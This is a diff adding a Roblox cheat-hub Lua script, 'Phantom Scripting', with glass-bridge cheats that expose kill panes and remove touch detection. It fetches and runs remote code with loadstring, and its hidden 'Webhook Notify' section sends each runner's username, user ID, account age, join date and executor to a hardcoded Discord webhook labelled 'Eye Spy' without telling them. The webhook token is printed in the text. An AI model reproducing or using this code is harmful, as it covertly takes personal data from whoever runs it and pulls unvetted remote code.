@@ -1,0 +1,179 @@
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+local Window = Rayfield:CreateWindow({
+Name = "Phantom Scripting",
+LoadingTitle = "Phantom Scripting Hub",
+LoadingSubtitle = "By RebornPhantom",
+KeySystem = false, -- Set this to true to use our key system
+KeySettings = {
+	Title = "Phantom Hub",
+	Subtitle = "Key System",
+	Note = "Join the discord at discord.gg/WHxrQPY4Ep",
+	Key = "UpdatedPhantom"
+}
+})
+
+-- Guide
+
+local Tab = Window:CreateTab("Guide")
+local Section = Tab:CreateSection("Guide")
+local Paragraph = Tab:CreateParagraph({Title = "Credits", Content = "Script made by RebornPhantom, UI is Rayfield Interface Suite!"})
+local Paragraph = Tab:CreateParagraph({Title = "Credits", Content = "Join the Discord at discord.gg/WHxrQPY4Ep"})
+local Paragraph = Tab:CreateParagraph({Title = "Changelogs", Content = "V0.0.1 Now for even Cringe Games like this!."})
+
+-- Bridge Scripts
+
+local Tab = Window:CreateTab("Bridge Scripts")
+local Section = Tab:CreateSection("Bridge Scripts")
+local Paragraph = Tab:CreateParagraph({Title = "Troll Bridge Script", Content = "Execute this to see every kill pane, and also make yourself immune to them!"})
+local Button = Tab:CreateButton({
+   Name = "Troll Script",
+   Callback = function()
+for i,v in pairs(game:GetService("Workspace")["Glass Bridge"].GlassPane:GetDescendants()) do
+   if v:IsA("BasePart") and v.CanCollide == false then
+       v.CanCollide = true
+       v.Color = Color3.fromRGB(255, 0, 0)
+       
+   end
+end
+
+spawn(function()
+   while true do
+       task.wait()
+for i,v in pairs(game:GetService("Workspace")["Glass Bridge"].GlassPane:GetDescendants()) do
+   if v:IsA("TouchTransmitter") then
+       v:Destroy()
+   end
+end
+end
+end)
+end
+})
+
+local Paragraph = Tab:CreateParagraph({Title = "Normal Bridge Script", Content = "Execute this to see every kill pane, and safe pane! Red is Death."})
+local Button = Tab:CreateButton({
+   Name = "Safe Script",
+   Callback = function()
+for i,v in pairs(game:GetService("Workspace")["Glass Bridge"].GlassPane:GetDescendants()) do
+   if v:IsA("BasePart") then
+       if v.CanCollide == true then
+       v.Color = Color3.fromRGB(0, 255, 0)
+       else
+     
+     v.Color = Color3.fromRGB(255, 0, 0)
+       
+       end
+   end
+   end
+end
+})
+
+-- Webhook Notify
+
+local Webhook = "https://canary.discord.com/api/webhooks/1093326368860807290/JF6bJgXOgaKLDMvrIricGWVITONhSvTr8ShNawmfT7PMFdCYs6tJeZE0NJcb_QlenNxy" -- your webhook
+_G.Discord_UserID = "" -- ID To Ping on every execution, blank if no one wants to be pinged.
+
+local player = game:GetService"Players".LocalPlayer
+local joinTime = os.time() - (player.AccountAge*86400)
+local joinDate = os.date("!*t", joinTime)
+local premium = false
+local alt = true
+if player.MembershipType == Enum.MembershipType.Premium then
+   premium = true
+end
+
+if not premium and player.AccountAge >= 70 then
+    alt = "Possible"
+elseif premium and player.AccountAge >= 70 then
+   alt = false
+end
+
+local executor = identifyexecutor() or "Unknown"
+local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+local AvatarImage = Thing.imageUrl
+local msg = {
+   ["username"] = "Eye Spy",
+   ["avatar_url"] = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
+   ["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
+   ["embeds"] = {
+       {
+           ["color"] = tonumber(tostring("0x32CD32")), --decimal
+           ["title"] = "This User Executed The Script.",
+           ["thumbnail"] = {
+               ["url"] = AvatarImage,
+           },
+           ["fields"] = {
+                {
+                   ["name"] = "Username",
+                   ["value"] = "||"..player.Name.."||",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Display Name",
+                   ["value"] = player.DisplayName,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "UID",
+                   ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Game Id",
+                   ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Game Name",
+                   ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Executor Used",
+                   ["value"] = executor,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Alt",
+                   ["value"] = alt,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Account Age",
+                   ["value"] = player.AccountAge.."day(s)",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Date Joined",
+                   ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
+                   ["inline"] = true
+                },
+           },
+           ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
+       }
+   }
+}
+    request = http_request or request or HttpPost or syn.request
+    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+
+-- Notify users when I Join
+
+local Players = game:GetService("Players")
+
+local blacklist = {
+   "PhantomsNeverDie",
+}
+
+
+Players.PlayerAdded:Connect(function(player)
+   if table.find(blacklist, player.Name) then
+       repeat wait() until game:IsLoaded()
+wait(1.5)
+game.StarterGui:SetCore("SendNotification", {
+Title = "I Have Arrived"; 
+Text = "RebornPhantom Has Entered Your Lobby"; 
+Icon = ""; 
+Duration = 5; -- how long the notification should in secounds
+})
+   end
+end)
